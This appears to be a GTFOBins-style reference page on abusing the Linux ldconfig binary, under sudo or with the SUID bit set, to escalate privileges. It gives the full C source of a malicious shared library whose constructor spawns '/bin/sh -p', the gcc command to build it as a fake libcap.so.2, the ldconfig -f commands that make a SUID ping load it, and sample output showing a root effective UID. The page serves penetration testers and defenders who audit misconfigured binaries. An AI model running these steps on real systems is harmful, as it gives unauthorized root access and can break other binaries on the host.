# GTFOBin: ldconfig

Follows a minimal example of how to use the described technique (details may change across different distributions).

Run the code associated with the technique.

Identify a target SUID executable, for example the `libcap` library of `ping`:

```
$ ldd /bin/ping | grep libcap
      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)

```

Create a fake library that spawns a shell at bootstrap:

```
echo '#include <unistd.h>

__attribute__((constructor))
static void init() {
    execl("/bin/sh", "/bin/sh", "-p", NULL);
}
' >"$TF/lib.c"

```

Compile it with:

```
gcc -fPIC -shared "$TF/lib.c" -o "$TF/libcap.so.2"

```

Run `ldconfig` again as described below then just run `ping` to obtain a root shell:

```
$ ping
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)

```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.

```
TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
sudo ldconfig -f "$TF/conf"
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

This allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.

```
sudo install -m =xs $(which ldconfig) .

TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
./ldconfig -f "$TF/conf"
```